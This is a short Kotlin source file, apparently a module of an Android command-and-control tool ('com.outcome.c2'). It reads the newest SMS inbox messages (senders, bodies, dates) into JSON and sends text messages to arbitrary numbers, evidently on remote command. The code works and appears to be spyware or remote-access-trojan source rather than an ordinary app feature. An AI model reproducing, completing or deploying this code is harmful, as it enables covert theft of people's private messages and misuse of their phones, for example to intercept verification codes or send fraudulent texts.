package com.outcome.c2

import android.content.Context
import android.net.Uri
import org.json.JSONArray
import org.json.JSONObject

object Sms {

    fun list(ctx: Context, limit: Int): JSONObject {
        val arr = JSONArray()
        val cursor = ctx.contentResolver.query(
            Uri.parse("content://sms/inbox"),
            arrayOf("_id", "address", "body", "date", "read"),
            null, null,
            "date DESC LIMIT $limit"
        )
        cursor?.use {
            while (it.moveToNext()) {
                arr.put(JSONObject().apply {
                    put("id", it.getLong(0))
                    put("address", it.getString(1) ?: "")
                    put("body", it.getString(2) ?: "")
                    put("date", it.getLong(3))
                    put("read", it.getInt(4) == 1)
                })
            }
        }
        return JSONObject().put("count", arr.length()).put("messages", arr)
    }

    fun send(ctx: Context, number: String, text: String): JSONObject {
        return try {
            val sm = android.telephony.SmsManager.getDefault()
            sm.sendTextMessage(number, null, text, null, null)
            JSONObject().put("ok", true).put("to", number)
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: "send_failed")
        }
    }
}
